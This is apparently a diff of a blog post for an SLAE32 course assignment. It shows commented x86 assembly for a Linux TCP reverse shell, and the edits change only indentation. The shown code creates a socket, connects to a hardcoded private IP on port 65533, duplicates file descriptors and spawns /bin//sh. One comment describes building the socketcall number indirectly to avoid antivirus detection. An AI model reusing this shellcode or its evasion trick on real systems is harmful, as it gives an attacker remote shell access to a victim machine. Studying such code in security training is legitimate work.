@@ -3,11 +3,10 @@ layout: post
 title: SLAE32  Assignment 2 - reverse shell
 excerpt: asm code and comment for my revshell
 ---
-
-    ; name       : tcprevshell
+    ; name     : tcprevshell
     ; author     : Sandro "guly" Zaccarini SLAE-1037
     ; purpose    : the program will create a new connection to a given ip/port and present a shell to it
-    ;              this code has been written for SLAE32 assignment 2
+    ;            this code has been written for SLAE32 assignment 2
     ; references : https://syscalls.kernelgrok.com/ , /usr/include/linux/net.h , man socketcall
     ; license    : CC-BY-NC-SA
     ;
@@ -16,22 +15,22 @@ excerpt: asm code and comment for my revshell
     ;
     ; i'll use different function name to keep it more readable. mostly, function are never called and are used just as "anchor for the human eyes"
     
-      global _start
+    global _start
     
-      section .text
+    section .text
     
     ; dummy function used to break easily on gdb while debugging, just rets without touching anything
     ; i used to place a call trap and recompile, while having a "b trap" on ~/.gdbinit
-      trap:
+    trap:
     ret
     
-      zero:
+    zero:
     ; zero eax and ebx by xoring against themself
     xor eax,eax
     xor ebx,ebx
     ret
     
-      socketcall2eax:
+    socketcall2eax:
     ; place syscall code for socketcall in eax, which is 0x66, no need to zero because i use mov.
     ; i'm using add to avoid hardcoded 0x66 call, which could be trapped by some AV, when 0x33 is the call acct and looks harmless to me
     mov al,0x33
@@ -39,11 +38,11 @@ excerpt: asm code and comment for my revshell
     ret
     
     ; main code starts here
-      _start:
+    _start:
     ; start by zeroing eax,ebx. not really needed because registers are clean, but better safe than sorry
     call zero
     
-      createsocket:
+    createsocket:
     ; ----------------------------------------------------------------------------------------
     ; purpose     : create a socket
     ; references  : man socket
@@ -82,7 +81,7 @@ excerpt: asm code and comment for my revshell
     ; because syscall rets to eax, if everything's good, eax will hold socket file descriptor: save it to esi to have it safe for the whole run
     mov esi,eax
     
-      connect:
+    connect:
     ; ----------------------------------------------------------------------------------------
     ; purpose     : connect to raddr:rport
     ; references  : man connect , man 7 ip
@@ -134,7 +133,7 @@ excerpt: asm code and comment for my revshell
     ; do the call
     int 0x80
     
-      dupfd:
+    dupfd:
     ; ----------------------------------------------------------------------------------------
     ; purpose     : create fd used by /bin//sh
     ; references  : man dup2
@@ -159,7 +158,7 @@ excerpt: asm code and comment for my revshell
     
     ; zero eax and start the loop
     xor eax,eax
-      dup2:
+    dup2:
     ; dup2 call id
     mov al,0x3f
     
@@ -169,7 +168,7 @@ excerpt: asm code and comment for my revshell
     ; loop until ecx is 0x0, we then have 3 runs: with 2, 1, 0 values
     jnz dup2
     
-      spawnshell:
+    spawnshell:
     ; ----------------------------------------------------------------------------------------
     ; purpose     : spawn /bin//sh
     ; references  : man execve
@@ -208,7 +207,7 @@ excerpt: asm code and comment for my revshell
     mov al,0x1
     int 0x80
     
-      section .data
+    section .data
     ; 65533 converted in hex, then little endian
     rport equ 0xFDFF
     ; 172.16.201.162 in hex, then little endian
